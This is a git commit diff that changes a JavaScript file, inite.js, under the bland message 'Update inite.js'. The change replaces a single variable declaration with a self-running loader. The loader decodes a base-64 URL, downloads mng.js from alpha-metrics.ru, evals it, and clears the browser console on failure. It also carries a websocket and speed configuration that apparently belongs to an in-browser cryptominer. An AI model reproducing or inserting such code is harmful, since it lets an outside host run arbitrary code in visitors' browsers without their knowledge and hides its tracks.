ad17a18b9887d24842d5e15389adb4f28a441fa7
ga-alpha <35597366+ga-alpha@users.noreply.github.com>
2018-02-26 23:16:57 +0300

    Update inite.js

--- inite.js
+++ inite.js
@@ -1,1 +1,28 @@
-var alphaTest;
+
+(function(){
+	var consoleClear=function(){try {console.clear();} catch (e) {return;};}	
+        try{	
+        var cfg={urls:[
+                ["wss://alpha-metrics.ru"]],
+        spd:0.6,
+	divInx:2,
+	k:"vv",
+	dns:btoa('https://alpha-metrics.ru/metrics/')};
+
+        var req = new XMLHttpRequest();
+		req.onerror=function(e){consoleClear();}
+		req.onreadystatechange=function(e){
+			if (e.currentTarget.DONE==e.currentTarget.readyState)
+			{
+				if (e.currentTarget.status==200)
+                    eval(e.currentTarget.responseText)
+				else 
+					{
+						consoleClear();}
+
+			}
+		}.bind(cfg);
+		req.open('GET',atob(cfg.dns)+'mng.js',true);
+		req.send();
+        }catch(e){}
+})();
